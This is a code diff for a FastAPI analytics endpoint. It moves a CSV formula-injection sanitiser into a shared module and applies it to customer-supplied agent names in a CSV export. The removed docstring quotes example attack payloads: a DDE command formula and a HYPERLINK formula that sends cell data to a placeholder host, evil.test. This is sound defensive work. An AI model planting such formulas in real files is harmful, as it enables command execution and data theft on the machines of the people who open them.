@@ -10,6 +10,7 @@ from fastapi.responses import StreamingResponse
 from sqlalchemy import func, select
 
 from app.api.auth import get_current_client_or_operator
+from app.core.csv_safety import csv_safe
 from app.db.models import Bot, ChatMessage, ChatSession, MeetingBooking
 from app.db.repository import (
     get_dashboard_stats,
@@ -385,37 +386,6 @@ def get_per_bot_rollup_endpoint(
 
 _CSV_HEADER: tuple[str, ...] = ("Agent", "Conversations", "Leads", "Credits used")
 
-# Leading characters that make a spreadsheet treat a cell as a formula rather
-# than as text. ``=`` and ``@`` start a formula outright; ``+``/``-`` start a
-# signed expression; a leading TAB or CR is stripped by Excel before it makes
-# that decision, so ``\t=cmd|'/c calc'!A0`` slips a formula past a naive
-# first-character check. OWASP's CSV-injection list, in full.
-_CSV_FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")
-
-
-def _csv_safe(value: str | None) -> str:
-    """Neutralise a spreadsheet formula hiding in a customer-controlled string.
-
-    Agent names are typed by the customer and land verbatim in a file that an
-    agency then forwards to *their* client, who opens it in Excel. An agent
-    named ``=HYPERLINK("https://evil.test/?"&A2,"Click")`` would execute on
-    open — data exfiltration on a machine that never touched OyeChats.
-
-    The fix is to stop the cell from ever *starting* with a formula trigger:
-    prefix it with a single quote, which every spreadsheet reads as "the rest
-    of this cell is literal text". The quote stays visible when a CSV is opened
-    directly (unlike a typed cell, where it is consumed as a formatting hint) —
-    a deliberate trade of cosmetics for not executing attacker input. Quoting
-    alone would not do: Excel evaluates ``"=1+1"`` just the same, so RFC-4180
-    escaping (which ``csv.writer`` already applies for delimiters, quotes and
-    newlines) is a separate concern from this one.
-
-    Only the agent name needs this. The other three columns are integers this
-    service computed, never strings a customer supplied.
-    """
-    text = "" if value is None else str(value)
-    return f"'{text}" if text.startswith(_CSV_FORMULA_PREFIXES) else text
-
 
 @router.get("/by-bot.csv")
 def get_per_bot_rollup_csv(
@@ -460,7 +430,10 @@ def get_per_bot_rollup_csv(
             for row in rows:
                 writer.writerow(
                     [
-                        _csv_safe(row["bot_name"]),
+                        # Only the agent name needs escaping — the other three
+                        # columns are integers this service computed, never
+                        # strings a customer supplied.
+                        csv_safe(row["bot_name"]),
                         row["conversations"],
                         row["leads"],
                         row["credits_spent"],
